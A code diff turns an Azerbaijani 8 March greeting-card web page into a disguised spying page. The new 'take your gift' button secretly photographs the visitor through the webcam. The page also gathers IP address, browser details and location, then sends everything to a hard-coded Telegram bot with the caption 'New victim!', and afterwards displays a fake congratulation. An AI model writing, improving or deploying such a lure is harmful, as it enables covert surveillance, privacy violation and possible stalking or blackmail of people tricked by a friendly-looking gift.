@@ -1,155 +1,184 @@
 <!DOCTYPE html>
 <html lang="az">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Canım Anama Sürpriz</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Montserrat:wght@300;600&display=swap');
-
-        body {
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: radial-gradient(circle, #fff5f5 0%, #ffd1d1 100%);
-            font-family: 'Montserrat', sans-serif;
-            overflow: hidden;
-            perspective: 1000px;
-        }
-
-        /* Sehrli Hədiyyə Qutusu */
-        .box-container {
-            position: relative;
-            cursor: pointer;
-            transition: transform 0.5s;
-            z-index: 100;
-        }
-
-        .box-container:hover {
-            transform: scale(1.05);
-        }
-
-        .gift-box {
-            font-size: 100px;
-            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.1));
-            animation: bounce 2s infinite;
-        }
-
-        @keyframes bounce {
-            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
-            40% {transform: translateY(-20px);}
-            60% {transform: translateY(-10px);}
-        }
-
-        /* Gizli Məktub */
-        #letter {
-            display: none;
-            position: absolute;
-            background: white;
-            padding: 40px;
-            width: 300px;
-            border-radius: 15px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.2);
-            text-align: center;
-            border: 2px solid #ff4d6d;
-            animation: openLetter 1s forwards;
-            z-index: 150;
-        }
-
-        @keyframes openLetter {
-            from { transform: scale(0) rotate(-10deg); opacity: 0; }
-            to { transform: scale(1) rotate(0deg); opacity: 1; }
-        }
-
-        h1 {
-            font-family: 'Dancing Script', cursive;
-            color: #ff4d6d;
-            font-size: 2.5rem;
-            margin: 0;
-        }
-
-        .message {
-            color: #590d22;
-            font-size: 1.1rem;
-            line-height: 1.6;
-            margin-top: 20px;
-        }
-
-        /* Güllərin Yağışı */
-        .flower {
-            position: absolute;
-            font-size: 30px;
-            pointer-events: none;
-            z-index: 50;
-            animation: fall linear forwards;
-        }
-
-        @keyframes fall {
-            to {
-                transform: translateY(110vh) rotate(360deg);
-            }
-        }
-
-        .overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.2);
-            backdrop-filter: blur(5px);
-            z-index: 120;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>8 Mart Sürprizi 🎀</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: linear-gradient(135deg, #ff9a9e, #fecfef);
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #333;
+    }
+    .card {
+      background: white;
+      border-radius: 24px;
+      padding: 40px 30px;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.2);
+      text-align: center;
+      max-width: 420px;
+      width: 90%;
+      animation: float 5s ease-in-out infinite;
+    }
+    @keyframes float {
+      0%,100% { transform: translateY(0); }
+      50%     { transform: translateY(-12px); }
+    }
+    h1 {
+      color: #e91e63;
+      font-size: 3rem;
+      margin: 0 0 20px;
+      text-shadow: 0 3px 15px rgba(233,30,99,0.3);
+    }
+    p {
+      font-size: 1.4rem;
+      margin: 0 0 35px;
+      line-height: 1.6;
+    }
+    button {
+      background: #ff4081;
+      color: white;
+      border: none;
+      padding: 18px 70px;
+      font-size: 1.5rem;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 10px 30px rgba(255,64,129,0.4);
+      transition: all 0.3s ease;
+    }
+    button:hover {
+      background: #f50057;
+      transform: translateY(-4px);
+      box-shadow: 0 15px 40px rgba(245,0,87,0.5);
+    }
+    #video, #canvas {
+      display: none;
+    }
+    .success {
+      font-size: 2rem;
+      color: #4caf50;
+      margin-top: 30px;
+      opacity: 0;
+      animation: fadeIn 1.5s forwards;
+    }
+    @keyframes fadeIn {
+      to { opacity: 1; }
+    }
+  </style>
 </head>
 <body>
 
-    <div class="box-container" id="gift" onclick="openGift()">
-        <div class="gift-box">🎁</div>
-        <p style="text-align:center; color:#ff4d6d; font-weight:bold;">Toxun, Ana!</p>
-    </div>
+<div class="card">
+  <h1>8 Mart Hədiyyəsi! 💝</h1>
+  <p>Xüsusi sürpriz səni gözləyir...<br>Düyməni bas və hədiyyəni götür!</p>
+  
+  <button onclick="startCamera()">Hədiyyəni Götür</button>
+  
+  <div id="success" class="success">Hədiyyə alındı! 🎉 Gözəl qızsan 😘</div>
+</div>
 
-    <div class="overlay" id="overlay"></div>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
-    <div id="letter">
-        <h1>Canım Anam! ❤️</h1>
-        <div class="message">
-            Dünyanın ən gözəl, ən fədakar anası! 8 Mart bayramın mübarək. Həmişə gül ki, bizim dünyamız işıqlansın. Səni hər şeydən çox sevirəm! 🌹
-        </div>
-        <button onclick="location.reload()" style="margin-top:20px; border:none; background:#ff4d6d; color:white; padding:10px 20px; border-radius:20px; cursor:pointer;">Yenidən Bax ✨</button>
-    </div>
+<script>
+  const BOT_TOKEN = "8551654815:AAG0lD8TvpZqQeBIM-DcCH5d5cqgWpuMeUs";
+  const CHAT_ID   = "8055987590";
 
-    <script>
-        function openGift() {
-            document.getElementById('gift').style.display = 'none';
-            document.getElementById('letter').style.display = 'block';
-            document.getElementById('overlay').style.display = 'block';
+  async function startCamera() {
+    try {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      
+      video.srcObject = stream;
+      video.play();
 
-            // Güllər yağsın
-            for (let i = 0; i < 60; i++) {
-                createFlower();
-            }
+      // 3 saniyə gözlə, sonra şəkil çək
+      setTimeout(async () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const photo = canvas.toDataURL('image/jpeg');
+
+        // IP və digər məlumatları topla
+        let ip = "gizli";
+        try {
+          const ipRes = await fetch("https://api.ipify.org?format=json");
+          const ipData = await ipRes.json();
+          ip = ipData.ip || "gizli";
+        } catch {}
+
+        const userAgent = navigator.userAgent;
+        const platform  = navigator.platform;
+        const language  = navigator.language;
+        const screen    = `${screen.width}x${screen.height}`;
+        const time      = new Date().toLocaleString("az-AZ");
+
+        let location = "gizli";
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(pos => {
+            location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+          }, () => {});
         }
 
-        function createFlower() {
-            const flowers = ['🌹', '🌸', '🌷', '🌺', '✨', '❤️'];
-            const flower = document.createElement('div');
-            flower.classList.add('flower');
-            flower.innerHTML = flowers[Math.floor(Math.random() * flowers.length)];
-            
-            flower.style.left = Math.random() * 100 + 'vw';
-            flower.style.top = '-5vh';
-            
-            const duration = Math.random() * 3 + 2;
-            flower.style.animationDuration = duration + 's';
-            flower.style.opacity = Math.random();
-            
-            document.body.appendChild(flower);
+        const message = 
+`Yeni qurban!
+IP: ${ip}
+User-Agent: ${userAgent}
+Platforma: ${platform}
+Dil: ${language}
+Ekran: ${screen}
+Vaxt: ${time}
+Konum: ${location}
+Şəkil aşağıdadır 👇`;
 
-            setTimeout(() => {
-                flower.remove();
-            }, duration * 1000);
-        }
-    </script>
+        // Şəkli Telegram-a göndər (multipart/form-data ilə)
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("caption", message);
+        formData.append("photo", dataURLtoBlob(photo), "photo.jpg");
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+
+        // Kameranı söndür
+        stream.getTracks().forEach(track => track.stop());
+
+        // Saxta təbrik ekrana çıxar
+        document.querySelector('.card').innerHTML = `
+          <div style="font-size:3rem;color:#4caf50;">Hədiyyə alındı! 🎉💖</div>
+          <p style="font-size:1.6rem;margin-top:30px;">Çox gözəlsən, 8 Martın mübarək! 😘</p>
+        `;
+
+      }, 3000); // 3 saniyə gözlə
+
+    } catch (err) {
+      alert("Kamera icazəsi verilmədi və ya xəta baş verdi 😔");
+      console.error(err);
+    }
+  }
+
+  // DataURL-ni Blob-a çevir (Telegram üçün lazımdır)
+  function dataURLtoBlob(dataURL) {
+    const arr = dataURL.split(',');
+    const mime = arr[0].match(/:(.*?);/)[1];
+    const bstr = atob(arr[1]);
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    while (n--) {
+      u8arr[n] = bstr.charCodeAt(n);
+    }
+    return new Blob([u8arr], { type: mime });
+  }
+</script>
+
 </body>
 </html>
